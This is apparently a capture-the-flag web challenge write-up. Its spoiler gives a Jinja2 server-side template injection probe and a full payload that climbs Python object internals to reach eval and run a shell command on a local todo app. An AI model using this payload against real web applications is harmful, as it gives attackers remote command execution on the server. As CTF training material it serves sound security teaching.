# Morty's Cleanup List

**Category**: Web

**Author**: s1kk1s

## Description
Morty was using the portal gun to fix the mess Rick created through his adventures. When Rick find out he got so mad that he is trying to hack on Morty's phone through his todo application! Can you help him retrive hte flag?

<details>
<summary>Reveal Spoiler</summary>

SSTI on Post request `http://127.0.0.1:5000/postTodo?todo=hack-morty&type={{{7*7}}}`

```
{%% for c in [].__class__.__base__.__subclasses__() %%}
{%% if c.__name__ == 'catch_warnings' %%}
  {%% for b in c.__init__.__globals__.values() %%}
  {%% if b.__class__ == {}.__class__ %%}
    {%% if 'eval' in b.keys() %%}
      {{{{ b['eval']('__import__("os").popen("cat flag.txt").read()') }}}}
    {%% endif %%}
  {%% endif %%}
  {%% endfor %%}
{%% endif %%}
{%% endfor %%}
```

</details>
